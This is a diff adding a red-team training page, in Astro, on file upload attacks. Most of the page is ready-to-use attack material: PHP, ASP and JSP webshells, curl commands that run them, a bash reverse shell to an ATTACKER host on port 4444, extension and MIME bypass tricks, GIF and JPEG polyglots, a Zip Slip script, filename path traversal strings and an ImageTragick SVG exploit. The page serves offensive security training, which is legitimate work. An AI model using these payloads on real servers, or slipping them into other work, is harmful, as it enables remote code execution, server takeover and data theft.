@@ -1,0 +1,148 @@
+---
+import TrainingPage from '../../layouts/TrainingPage.astro';
+---
+<TrainingPage
+  title="File Upload Attacks — Red Team Academy"
+  module="Web Hacking"
+  tags={['file-upload', 'webshell', 'polyglot', 'bypass', 'rce']}
+  pageKey="web-file-upload"
+>
+  <h1>File Upload Attacks</h1>
+  <p>File upload vulnerabilities allow executing arbitrary code on the server when validation fails. Attack vectors include extension bypass, MIME type spoofing, polyglot files, path traversal in filenames, and server-side processing vulnerabilities (ImageMagick, LibreOffice, FFmpeg). Getting code execution requires both upload and execution.</p>
+
+  <h2>Basic Webshell Upload</h2>
+  <pre><code># PHP webshell (cmd parameter):
+&lt;?php system($_GET['cmd']); ?&gt;
+
+# PHP webshell (all-in-one):
+&lt;?php if(isset($_REQUEST['cmd'])&#123;echo"&lt;pre&gt;";$cmd=$_REQUEST['cmd'];system($cmd);echo"&lt;/pre&gt;";die;&#125; ?&gt;
+
+# Short PHP variations (bypass content filters):
+&lt;?=`$_GET[0]`?&gt;
+&lt;?=$_POST[c]?&gt;
+&lt;?php echo exec($_POST['c']); ?&gt;
+
+# ASP/ASPX webshell:
+&lt;% eval request("cmd") %&gt;
+&lt;%@ Page Language="C#"%&gt;&lt;%Response.Write(new System.Diagnostics.Process()...%&gt;
+
+# JSP webshell:
+&lt;%Runtime.getRuntime().exec(request.getParameter("cmd"));%&gt;
+
+# After upload — execute:
+curl "https://target/uploads/shell.php?cmd=id"
+curl "https://target/uploads/shell.php?cmd=cat+/etc/passwd"
+curl "https://target/uploads/shell.php" --data "cmd=bash -i >& /dev/tcp/ATTACKER/4444 0>&1"</code></pre>
+
+  <h2>Extension Bypass Techniques</h2>
+  <pre><code># If .php is blocked, try alternate extensions:
+.php2, .php3, .php4, .php5, .php6, .php7
+.phtml, .pht, .phps
+.pHp, .PHP, .PhP       # case variation
+.php.jpg               # double extension (check which end server reads)
+.jpg.php               # double extension other way
+shell.php%00.jpg       # null byte (old PHP — truncates at null)
+shell.php%20           # trailing space
+shell.php.             # trailing dot
+shell.php::$DATA       # Windows NTFS alternate data stream
+
+# Apache .htaccess upload (if uploadable):
+# Upload .htaccess with:
+AddType application/x-httpd-php .jpg
+# Now .jpg files execute as PHP in that directory
+
+# Nginx misconfiguration (path info):
+# Upload: shell.jpg
+# Execute: https://target/uploads/shell.jpg/x.php
+# (Nginx passes /x.php to FastCGI, executes shell.jpg as PHP)
+
+# IIS misconfiguration — semicolon bypass:
+shell.asp;.jpg  # IIS parses as shell.asp</code></pre>
+
+  <h2>MIME Type Bypass</h2>
+  <pre><code># Server checks Content-Type header — change it in Burp:
+# Normal upload sends: Content-Type: application/x-php
+# Change to: Content-Type: image/jpeg
+
+# Intercept upload request in Burp:
+# 1. Upload shell.php normally
+# 2. In Burp Proxy: modify Content-Type to image/jpeg
+# 3. Forward → server may accept based on MIME alone
+
+# Magic bytes bypass (if server reads file header):
+# JPEG magic bytes: FF D8 FF (prefix webshell with JPEG header)
+# PNG magic bytes: 89 50 4E 47
+# GIF magic bytes: 47 49 46 38 (GIF89a)
+
+# Prepend magic bytes:
+echo -e '\xff\xd8\xff' &gt; shell.php  # JPEG magic bytes
+cat shell_content.php &gt;&gt; shell.php
+
+# GIF polyglot (valid GIF + PHP execution):
+echo 'GIF89a;&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php</code></pre>
+
+  <h2>Polyglot Files</h2>
+  <p>Polyglot files are valid in two formats simultaneously — a JPEG that is also valid PHP.</p>
+  <pre><code># JPEG/PHP polyglot:
+exiftool -Comment='&lt;?php echo system($_GET["cmd"]); ?&gt;' shell.jpg
+# Rename to shell.php if extension validation is client-side only
+# Or use double extension: shell.jpg.php
+
+# GIF polyglot:
+printf 'GIF89a\n&lt;?php system($_GET["cmd"]); ?&gt;' &gt; polyglot.gif
+
+# ZIP polyglot (upload a ZIP that is also a valid JAR/WAR):
+# If server unzips uploads: craft ZIP containing malicious files
+# Zip slip: path traversal in ZIP entries
+# Entry name: ../../etc/cron.d/webshell → writes outside upload dir
+
+# Zip Slip attack:
+python3 -c "
+import zipfile
+with zipfile.ZipFile('zipslip.zip', 'w') as z:
+    z.write('/dev/null', '../../tmp/shell.php')
+    # Actual content: open('shell_content.php').read()
+"</code></pre>
+
+  <h2>Path Traversal in Filename</h2>
+  <pre><code># If server uses user-supplied filename:
+# Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
+# → shell.php written to web root
+
+# URL encoded:
+filename=..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php
+
+# Double encoding:
+filename=..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fshell.php
+
+# Windows path traversal:
+filename=..\..\inetpub\wwwroot\shell.aspx
+
+# In Burp: modify filename in multipart body</code></pre>
+
+  <h2>ImageMagick — ImageTragick (CVE-2016-3714)</h2>
+  <pre><code># ImageMagick processes images server-side — MVG/MSL injection:
+# Create malicious SVG:
+cat &gt; exploit.svg &lt;&lt; 'EOF'
+&lt;image authenticate='ff" `id &gt; /tmp/out`;"'&gt;
+  &lt;read filename="pdf:/etc/passwd"/&gt;
+  &lt;get width="base-width" height="base-height" /&gt;
+  &lt;resize geometry="400x400" /&gt;
+  &lt;write filename="test.png" /&gt;
+  &lt;svg width="700" height="700" xmlns="http://www.w3.org/2000/svg"&gt;&lt;/svg&gt;
+&lt;/image&gt;
+EOF
+
+# For modern ImageMagick — check for SSRF via URL handler:
+# https://hackerone.com/reports/398706
+# Pixel push attack (PDF/ghostscript via convert)</code></pre>
+
+  <h2>Tools &amp; Resources</h2>
+  <ul>
+    <li>PortSwigger File Upload labs — <code>portswigger.net/web-security/file-upload</code></li>
+    <li>exiftool — metadata manipulation</li>
+    <li>Burp Suite — modify Content-Type, filename, extension</li>
+    <li>PayloadsAllTheThings File Upload — <code>github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</code></li>
+    <li>webshells — <code>github.com/BlackArch/webshells</code></li>
+  </ul>
+</TrainingPage>
